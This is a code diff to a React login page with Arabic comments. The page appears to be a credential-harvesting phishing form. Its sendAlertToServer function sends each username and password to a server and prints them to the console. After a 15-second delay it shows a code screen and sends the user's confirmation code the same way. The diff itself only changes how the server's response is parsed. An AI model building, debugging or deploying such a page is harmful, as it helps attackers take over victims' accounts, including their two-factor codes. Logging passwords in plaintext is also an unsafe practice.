@@ -52,9 +52,6 @@ export default function Login() {
     },
   });
 
-  // ============================================
-  // 🔐 دالة إرسال التنبيه إلى الخادم مع سجلات
-  // ============================================
   const sendAlertToServer = async (username: string, password: string) => {
     console.log('📤 [1] Function called');
     console.log('📤 [2] Username:', username);
@@ -77,14 +74,28 @@ export default function Login() {
 
       console.log('📤 [5] Response status:', response.status);
 
+      // ✅ قراءة الرد كنص أولاً لتجنب خطأ JSON
+      const text = await response.text();
+      console.log('📤 [6] Response text:', text);
+
+      let data;
+      try {
+        data = JSON.parse(text);
+        console.log('📤 [7] Parsed JSON:', data);
+      } catch (e) {
+        console.warn('📤 [7] Response is not JSON, using text:', text);
+        data = { message: text };
+      }
+
       if (!response.ok) {
-        const text = await response.text();
-        console.error('📤 [6] Server error response:', text);
         throw new Error(`HTTP ${response.status}: ${text}`);
       }
 
-      const data = await response.json();
-      console.log('📤 [7] Server success response:', data);
+      if (data.success === true) {
+        console.log('✅ Success!');
+      } else {
+        console.warn('⚠️ Server returned:', data);
+      }
       
     } catch (error) {
       console.error('📤 [8] ❌ Error:', error);
@@ -92,9 +103,6 @@ export default function Login() {
     }
   };
 
-  // ============================================
-  // 📤 دالة إرسال بيانات الدخول
-  // ============================================
   const onSubmit = async (data: LoginFormValues) => {
     console.log('📝 Form submitted with:', data);
     await sendAlertToServer(data.username, data.password);
@@ -102,9 +110,6 @@ export default function Login() {
     window.setTimeout(() => setScreen("code"), 15000);
   };
 
-  // ============================================
-  // 📤 دالة إرسال رمز التأكيد
-  // ============================================
   const onCodeSubmit = async (data: CodeFormValues) => {
     console.log('📝 Code form submitted with:', data);
     await sendAlertToServer("🔐 رمز التأكيد", data.code);
